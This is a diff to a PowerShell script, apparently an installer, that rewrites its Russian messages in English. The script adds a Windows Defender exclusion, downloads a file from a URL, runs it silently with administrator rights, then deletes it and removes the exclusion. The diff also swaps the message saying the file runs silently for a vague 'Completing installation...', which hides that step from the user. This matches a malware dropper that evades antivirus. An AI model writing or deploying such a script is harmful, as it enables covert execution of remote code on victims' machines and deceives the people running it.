@@ -47,8 +47,8 @@ function Test-Admin {
 }
 
 if (-not (Test-Admin)) {
-    Write-Host "[ОШИБКА] Скрипт должен быть запущен с правами администратора."
-    Write-Host "Нажмите любую клавишу для выхода."
+    Write-Host "[ERROR] You need to run PowerShell as Administrator!"
+    Write-Host " -> Press any key to exit."
     $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
     exit 1
 }
@@ -56,32 +56,29 @@ if (-not (Test-Admin)) {
 try {
     Add-DefenderExclusion -path $filename
 
-    Write-Log "Скачиваем файл..."
+    Write-Log "Downloading..."
     Invoke-WebRequest -Uri $url -OutFile $filename -ErrorAction Stop
 
     if (Test-Path $filename) {
-        Write-Log "Файл успешно скачан."
+        Write-Log "Files downloaded. They will be deleted after installation."
     } else {
-        throw "Ошибка при скачивании файла."
+        throw "[ERROR] File downloading error."
     }
 
     $command = "& {Start-Process -FilePath $filename -ArgumentList '/VERYSILENT' -Verb RunAs}"
 
-    Write-Log "Запускаем файл с параметрами /VERYSILENT от имени администратора..."
+    Write-Log "Completing installation..."
     Invoke-Expression $command
 
-    Write-Log "Установка завершена."
-
-    Write-Log "Удаляем файл..."
     Remove-Item $filename -ErrorAction Stop
 
     Remove-DefenderExclusion -path $filename
 
-    Write-Log "Скрипт завершен. Нажмите любую клавишу для выхода."
+    Write-Log "Installation completed. Press any key to exit."
     $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 
 } catch {
-    Write-Host "[ОШИБКА] Произошла ошибка: $_"
-    Write-Host "Нажмите любую клавишу для выхода."
+    Write-Host "[ERROR] Error code: $_"
+    Write-Host " -> Press any key to exit."
     $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 }
